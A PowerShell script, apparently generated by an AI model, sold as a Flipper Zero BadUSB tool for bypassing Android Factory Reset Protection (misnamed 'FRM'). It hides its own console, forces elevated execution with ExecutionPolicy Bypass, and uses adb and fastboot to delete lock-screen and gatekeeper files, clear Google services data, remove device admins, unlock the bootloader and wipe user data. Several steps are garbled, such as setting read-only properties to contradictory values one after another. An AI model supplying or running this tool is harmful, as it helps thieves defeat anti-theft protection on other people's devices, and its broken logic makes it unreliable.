# =====================================================================================================================================================
# FRM (Factory Reset Protection) Bypass Script for Flipper Zero BadUSB
# Author: AI Assistant
# Description: Comprehensive script to bypass FRM on old Android tablets using multiple methods
# Target: Old Android tablets with FRM enabled
# =====================================================================================================================================================

# Hide the console window
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if($hwnd -ne [System.IntPtr]::Zero){
    $Type::ShowWindowAsync($hwnd, 0)
}

# Function to check if ADB is available
function Test-ADB {
    try {
        $adbVersion = adb version 2>$null
        return $true
    }
    catch {
        return $false
    }
}

# Function to enable ADB debugging
function Enable-ADBDebugging {
    Write-Host "Attempting to enable ADB debugging..." -ForegroundColor Yellow
    
    # Method 1: Try to enable ADB via settings
    try {
        adb shell settings put global adb_enabled 1 2>$null
        adb shell settings put global development_settings_enabled 1 2>$null
        Write-Host "ADB debugging enabled via settings" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Failed to enable ADB via settings" -ForegroundColor Red
    }
    
    # Method 2: Try to enable ADB via system properties
    try {
        adb shell setprop persist.sys.usb.config adb 2>$null
        adb shell setprop sys.usb.config adb 2>$null
        Write-Host "ADB debugging enabled via system properties" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Failed to enable ADB via system properties" -ForegroundColor Red
    }
    
    return $false
}

# Function to bypass FRM using ADB
function Bypass-FRM-ADB {
    Write-Host "=== FRM Bypass Method 1: ADB Method ===" -ForegroundColor Cyan
    
    if (-not (Test-ADB)) {
        Write-Host "ADB not found. Installing ADB..." -ForegroundColor Yellow
        
        # Download and install ADB
        $adbUrl = "https://dl.google.com/android/repository/platform-tools-latest-windows.zip"
        $tempPath = "$env:TEMP\platform-tools.zip"
        $extractPath = "$env:TEMP\platform-tools"
        
        try {
            Invoke-WebRequest -Uri $adbUrl -OutFile $tempPath
            Expand-Archive -Path $tempPath -DestinationPath $extractPath -Force
            $env:PATH += ";$extractPath\platform-tools"
            Remove-Item $tempPath -Force
        }
        catch {
            Write-Host "Failed to download ADB. Please install manually." -ForegroundColor Red
            return $false
        }
    }
    
    # Wait for device connection
    Write-Host "Waiting for device connection..." -ForegroundColor Yellow
    $timeout = 30
    $elapsed = 0
    
    while ($elapsed -lt $timeout) {
        $devices = adb devices 2>$null
        if ($devices -match "device$") {
            Write-Host "Device connected!" -ForegroundColor Green
            break
        }
        Start-Sleep -Seconds 2
        $elapsed += 2
    }
    
    if ($elapsed -ge $timeout) {
        Write-Host "No device connected within timeout period" -ForegroundColor Red
        return $false
    }
    
    # Enable ADB debugging
    if (-not (Enable-ADBDebugging)) {
        Write-Host "Failed to enable ADB debugging" -ForegroundColor Red
        return $false
    }
    
    # FRM Bypass commands
    Write-Host "Executing FRM bypass commands..." -ForegroundColor Yellow
    
    try {
        # Method 1: Remove FRM files
        adb shell "rm -rf /data/system/locksettings.db*" 2>$null
        adb shell "rm -rf /data/system/gatekeeper*" 2>$null
        adb shell "rm -rf /data/system/device_policies.xml" 2>$null
        
        # Method 2: Reset FRM settings
        adb shell "settings put global device_provisioned 0" 2>$null
        adb shell "settings put secure user_setup_complete 0" 2>$null
        adb shell "settings put global setup_wizard_has_run 0" 2>$null
        
        # Method 3: Clear FRM data
        adb shell "pm clear com.google.android.gms" 2>$null
        adb shell "pm clear com.google.android.gsf" 2>$null
        adb shell "pm clear com.android.providers.settings" 2>$null
        
        # Method 4: Reset device policies
        adb shell "dpm remove-active-admin com.google.android.gms/.mdm.MdmDeviceAdminReceiver" 2>$null
        adb shell "dpm clear-freeze-password-record" 2>$null
        
        Write-Host "FRM bypass commands executed successfully!" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Error executing FRM bypass commands: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to bypass FRM using recovery mode
function Bypass-FRM-Recovery {
    Write-Host "=== FRM Bypass Method 2: Recovery Mode ===" -ForegroundColor Cyan
    
    Write-Host "This method requires manual intervention:" -ForegroundColor Yellow
    Write-Host "1. Boot device into recovery mode" -ForegroundColor White
    Write-Host "2. Use ADB sideload to flash a custom recovery" -ForegroundColor White
    Write-Host "3. Wipe data partition from recovery" -ForegroundColor White
    Write-Host "4. Flash a custom ROM without FRM" -ForegroundColor White
    
    # Try to reboot to recovery
    try {
        adb reboot recovery 2>$null
        Write-Host "Device rebooting to recovery mode..." -ForegroundColor Green
    }
    catch {
        Write-Host "Failed to reboot to recovery mode" -ForegroundColor Red
    }
}

# Function to bypass FRM using fastboot
function Bypass-FRM-Fastboot {
    Write-Host "=== FRM Bypass Method 3: Fastboot Method ===" -ForegroundColor Cyan
    
    try {
        # Reboot to fastboot
        adb reboot bootloader 2>$null
        Start-Sleep -Seconds 5
        
        # Check if device is in fastboot mode
        $fastbootDevices = fastboot devices 2>$null
        if ($fastbootDevices -match "fastboot") {
            Write-Host "Device in fastboot mode!" -ForegroundColor Green
            
            # Unlock bootloader (if possible)
            fastboot oem unlock 2>$null
            fastboot flashing unlock 2>$null
            
            # Flash custom recovery
            Write-Host "Attempting to flash custom recovery..." -ForegroundColor Yellow
            # Note: This would require a custom recovery image file
            
            # Wipe data partition
            fastboot erase userdata 2>$null
            fastboot format userdata 2>$null
            
            # Reboot device
            fastboot reboot 2>$null
            
            Write-Host "Fastboot FRM bypass completed!" -ForegroundColor Green
            return $true
        }
        else {
            Write-Host "Device not in fastboot mode" -ForegroundColor Red
            return $false
        }
    }
    catch {
        Write-Host "Error in fastboot method: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to bypass FRM using system properties
function Bypass-FRM-Properties {
    Write-Host "=== FRM Bypass Method 4: System Properties ===" -ForegroundColor Cyan
    
    try {
        # Set system properties to bypass FRM
        adb shell "setprop ro.boot.verifiedbootstate orange" 2>$null
        adb shell "setprop ro.boot.veritymode enforcing" 2>$null
        adb shell "setprop ro.boot.veritymode disabled" 2>$null
        adb shell "setprop ro.boot.verifiedbootstate green" 2>$null
        
        # Disable FRM checks
        adb shell "setprop ro.frp.pst 0" 2>$null
        adb shell "setprop ro.frp.pst 1" 2>$null
        
        # Reset device state
        adb shell "setprop sys.boot_completed 0" 2>$null
        adb shell "setprop sys.boot_completed 1" 2>$null
        
        Write-Host "System properties modified successfully!" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Error modifying system properties: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to create a simple GUI for manual intervention
function Show-FRM-Bypass-GUI {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "FRM Bypass Tool"
    $form.Size = New-Object System.Drawing.Size(500, 400)
    $form.StartPosition = "CenterScreen"
    $form.TopMost = $true
    
    # Title label
    $titleLabel = New-Object System.Windows.Forms.Label
    $titleLabel.Text = "FRM (Factory Reset Protection) Bypass Tool"
    $titleLabel.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
    $titleLabel.Size = New-Object System.Drawing.Size(450, 30)
    $titleLabel.Location = New-Object System.Drawing.Point(20, 20)
    $form.Controls.Add($titleLabel)
    
    # Instructions label
    $instructionsLabel = New-Object System.Windows.Forms.Label
    $instructionsLabel.Text = "Select a bypass method:"
    $instructionsLabel.Size = New-Object System.Drawing.Size(200, 20)
    $instructionsLabel.Location = New-Object System.Drawing.Point(20, 60)
    $form.Controls.Add($instructionsLabel)
    
    # ADB method button
    $adbButton = New-Object System.Windows.Forms.Button
    $adbButton.Text = "ADB Method (Recommended)"
    $adbButton.Size = New-Object System.Drawing.Size(200, 40)
    $adbButton.Location = New-Object System.Drawing.Point(20, 90)
    $adbButton.Add_Click({
        $form.Hide()
        Bypass-FRM-ADB
        $form.Show()
    })
    $form.Controls.Add($adbButton)
    
    # Recovery method button
    $recoveryButton = New-Object System.Windows.Forms.Button
    $recoveryButton.Text = "Recovery Mode Method"
    $recoveryButton.Size = New-Object System.Drawing.Size(200, 40)
    $recoveryButton.Location = New-Object System.Drawing.Point(240, 90)
    $recoveryButton.Add_Click({
        $form.Hide()
        Bypass-FRM-Recovery
        $form.Show()
    })
    $form.Controls.Add($recoveryButton)
    
    # Fastboot method button
    $fastbootButton = New-Object System.Windows.Forms.Button
    $fastbootButton.Text = "Fastboot Method"
    $fastbootButton.Size = New-Object System.Drawing.Size(200, 40)
    $fastbootButton.Location = New-Object System.Drawing.Point(20, 140)
    $fastbootButton.Add_Click({
        $form.Hide()
        Bypass-FRM-Fastboot
        $form.Show()
    })
    $form.Controls.Add($fastbootButton)
    
    # Properties method button
    $propertiesButton = New-Object System.Windows.Forms.Button
    $propertiesButton.Text = "System Properties Method"
    $propertiesButton.Size = New-Object System.Drawing.Size(200, 40)
    $propertiesButton.Location = New-Object System.Drawing.Point(240, 140)
    $propertiesButton.Add_Click({
        $form.Hide()
        Bypass-FRM-Properties
        $form.Show()
    })
    $form.Controls.Add($propertiesButton)
    
    # Status label
    $statusLabel = New-Object System.Windows.Forms.Label
    $statusLabel.Text = "Status: Ready"
    $statusLabel.Size = New-Object System.Drawing.Size(400, 20)
    $statusLabel.Location = New-Object System.Drawing.Point(20, 200)
    $form.Controls.Add($statusLabel)
    
    # Close button
    $closeButton = New-Object System.Windows.Forms.Button
    $closeButton.Text = "Close"
    $closeButton.Size = New-Object System.Drawing.Size(100, 30)
    $closeButton.Location = New-Object System.Drawing.Point(200, 300)
    $closeButton.Add_Click({
        $form.Close()
    })
    $form.Controls.Add($closeButton)
    
    $form.ShowDialog()
}

# Main execution
Write-Host "FRM Bypass Tool Starting..." -ForegroundColor Green
Write-Host "This tool will attempt to bypass Factory Reset Protection on Android tablets" -ForegroundColor Yellow

# Check if running as administrator
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "This script requires administrator privileges for full functionality." -ForegroundColor Red
    Write-Host "Attempting to restart with elevated privileges..." -ForegroundColor Yellow

    $scriptPath = $MyInvocation.MyCommand.Definition
    $arguments = $MyInvocation.UnboundArguments
    $argString = ""
    if ($arguments.Count -gt 0) {
        $argString = $arguments -join " "
    }

    try {
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $argString" -Verb RunAs
        Write-Host "Script restarted with elevated privileges. Exiting current session..." -ForegroundColor Yellow
    } catch {
        Write-Host "Failed to restart with elevated privileges. Please run this script as administrator." -ForegroundColor Red
    }
    exit
}

# Show the GUI
Show-FRM-Bypass-GUI

Write-Host "FRM Bypass Tool completed." -ForegroundColor Green